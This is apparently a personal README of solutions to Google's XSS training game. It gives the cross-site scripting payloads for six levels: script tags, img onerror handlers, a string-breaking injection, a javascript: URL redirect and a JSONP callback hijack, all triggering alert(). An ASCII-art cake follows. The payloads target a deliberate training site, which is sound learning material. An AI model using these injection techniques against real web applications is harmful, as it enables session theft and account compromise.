# Game-xss
My solutions for https://xss-game.appspot.com

##Step 1
```javascript
<script>alert(1);</script>
```
##Step 2
```html
<img src="forbidden" onerror="alert('1')" />
```
##Step 3
Replace
```html
<img src="/static/level3/cloud3.jpg">
```
replace with
```html
<img src="/static/level3/#6.jpg" onerror="alert(1)">
```
##Step 4
```javascript
1');alert('1
```
##Step 5
```html
<img src="/static/logos/level5.png"/>
```
```html
<img src="/static/logos/level566.png" onerror="alert('1')"/>
```
replace with
or rewrite url with get parameter
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('GG')
```
##Step 6
```
frame#www.google.com/jsapi?callback=alert
```
Do you want a piece of cake?
```
                                                         -oooo:-                                                        
                                                        omhsoosho`                                                      
                                                        Ndo:``:oh-                                                      
                                                        dms+--+ym:                                                      
                                                        -ymhohdh+`                                                      
                                                         `N/`.s.                                                        
                                                          +:  +                                                         
                                                          --  :                                                         
                                                          --  o                                                         
                                                          ..  +                                                         
                                                          ::  s        ..`                                              
                                                .:sssso.  --  +     :syhhyo`                                            
                                ..::::.       `odhhyyhdd. ::  s    .mhhyhhdh.       -:...`                              
                               /dhhhhhhs     .odddhyhdddh+y:  my-syhdhhyhhddy/`   .odhyyhh:                             
                              yNdhyyoyhmo+::+ms/+++//++/odm:  NNmNd+///+++/+ody::omhyssyhdm-                            
                            -sddyyyyyyyoommmmmmdhyyyyyyhddd: `ddmdmdhyssyyhhmmNNNNdhyyyyyhmo-`                          
                        ``-omdyyyssys///shdddddddddmmdddhyy-``yhddddhhhhhdmmmmmmdd/oyssyyyyhmhss-`                      
                     `:ohhdmddhhyyyyyshddddhhyyyyyhddhhyo:-...--shhyysssyyhhdhhhddyyysyyyhdddmNNmyo.                    
                    /hNNmmd/:o+/////:`/osyhhyyys+syyhhyysysooossyyyyyooyyyyyyysyy+./oooooos/:ydNNmNmo.                  
                   +dNmmmmmhoo+///////oossshhyyyyyyyyssoossoosoosssyyyyyyyhsoyyyys/:-..--:/+sdddmmmNMy                  
                  `hNmmdmmdmddddhhhyhysso+.oyssssso-./o:-/+oo++oo--osoooooo..oyyhyyyyyyhhhyhdddmmdmNNN                  
                  `yNmNNhhdmdddhhhyyyyyyys:-......`./+++/:o++oo++/-````..::/+sysysyyyhsshhhydddmmmNNNN                  
                   sMNNNNNNmmdmdhhhhyyyyyyhhssssoo+oo/+//:/+//+:++++ooosyooyssosyyhhyhsshdhdmmNmNmmMMN                  
                   -NNNNNNhmNmdmmmdddddmhhhyyyyssys///+/:://////o+osoo+osoossosyhhdddh+omddmNNmmNmNMMN                  
                   oMNNNNNNNNdydNmmmmmdhydhhsoooodhydhsshys+soyooooosssyhyhymdhdhyddmmmdmNNNNNNmNNNMMM                  
                   yMMNNNMmmNdmmNNNNNNmh/sysyysyhyddmhhyhyhhddyyyhmddhhdmdddmmmdmmmmNNmmmNmNNNNmMNMMMM                  
                  .dMMNNMMNNNmNNNNNNmmNNhsddddNNdmhdmddyyhdhdhdddhdmhhdddhmddmmmNNNNNNNNNNNNNNNNMNMMMM                  
                  :NMMMNMMNMNhhmNNNNmdmNNmhddmdNmmmmmmddddNmdhdhddddmddmmmmmmNdNmdmmNNNmNNNNNdmMMMMMMM                  
                  -mMMMMMNNmNNmNNNNNNNNNNNdmmNmNmNmNmmNNmmNNdhddmmmmNmhhhyohNMNMNmmmmNdmNNMMMNNMMMMMMM                  
                  .dMMMMMMNNNMMMMMNNNNNMNmmmNNNmmmmNNdddmmNNNmmdNNmNNNmmNNNNNNNNNNNNNNNmNNNNNmNMMMMMMM                  
                  :NMMMMMMMMMMMMMMMNmmNMNNNNNNNmmNmNNNNmdmNNNNNNNmNNdmNNMMNMmNNNNNNMMNdmNNNMNmmMMMMMMM                  
                  :NNMMMMMMMMMMMMMMMMNNMNNMNNNMMMNNNNNNmNmdmmmNNNNNNmmNNNNNNNNNNMNNMMMNNNNMMNmMMMMNNMN                  
                  :NMMMNNMMMMMMMMMMMMMNNMMMMNMMMNmNNMNNNNNmhNMNNMNNNMMNMMMMMNNMMNNNMNMMMMNMMNNMMNMNMMM                  
                  `hMMMNdMNNMNNNNNMMNNNNMMMMMMMMNmNMMMMNNNNNNNdmmmMNMMMMMMNNMMNmdNMMNMNNNNMNmmNMNMMMMN                  
                   yMMMMNMMNMNmmNNNMNmddmMMNNNMNNNNNMMNNNNMNNNNNNNmNNNNNNNNNNNNNddNdmdmmNNMNNdMMMMMMMN                  
                   yMMMMNMNMMNNMMNNNNmdmmNMNNdhmMNNNNNNmNMMddddmNNNmNNMMNmNmmmmmNNmmmmNMMMMMMNNNMMMMMN                  
                   yNNNMMNNMMMMMMNNNNNMmmdNNNNNNNNNNNNmNNNNNmNmmNNNNNNNNNNNmNmNNNNNNNNNNNNNMMMNNMMMMMy                  
                   +MMMMMMMMMMMNNNNMMMNNNNmNNNMNMNNMNNmhdNNNNNmNNNmmNNNNNNNNNNNMMNNmNNNNNMNMNMMMMMMMN:                  
                    NMMMMNMMMMMMMNNNNNNdNMNNNNNNmNNNNNNNNNmmhNNNNmdNNNNNNNNNMMNNMNNNNNNNNNMMMMNNMMMNs`                  
                    -sdmNMNNMMMMMNNNNmmmmNNNMNmNMNNNNNNNMNmNNNNNNmmmdmNNNMNmmmmNMNNMNMmmNNMMMNMNmd+-`                   
                      `.ohNNMMNMMNMNNmdmNNNNNNmNMNNMNNNNmNNNmmmNmNMMNNMNNMMNNNNNNNNNNMMMMMMMNNho.`                      
                          :+hdNNNNNNNNNNNNNNmNNNNNNNMNNNmNNNNmMmmmNNNMNNNNNNNNMNNMMMMMNNmdds/-                          
                             `--:+shddmmNmmmmNNNNMNNNMNNNNNNNNNNMMNMMMNNNmNNNMNNNNdh++/-.`                           
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTEyOTYwMDY1ODNdfQ==
-->